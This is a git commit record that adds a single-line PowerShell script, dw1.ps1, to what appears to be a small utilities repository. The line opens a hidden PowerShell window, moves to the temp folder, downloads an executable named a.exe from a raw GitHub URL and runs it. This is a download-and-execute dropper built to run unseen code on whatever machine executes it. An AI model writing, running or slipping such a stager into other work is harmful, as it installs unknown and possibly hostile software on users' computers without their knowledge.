7bb1278d6f5ff7b65c07e730fc013874e9619536
Sxcrate <88933467+sxcrate@users.noreply.github.com>
2024-04-17 11:56:07 +0200

    Create dw1.ps1

---
+++ dw1.ps1
@@ -0,0 +1,1 @@
+Start-Process -FilePath "powershell" -ArgumentList "/c cd $Env:temp;Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/sxcrate/utils/main/a.exe' -OutFile 'a.exe'; Start-Process -FilePath '.\a.exe'; exit" -WindowStyle Hidden; exit
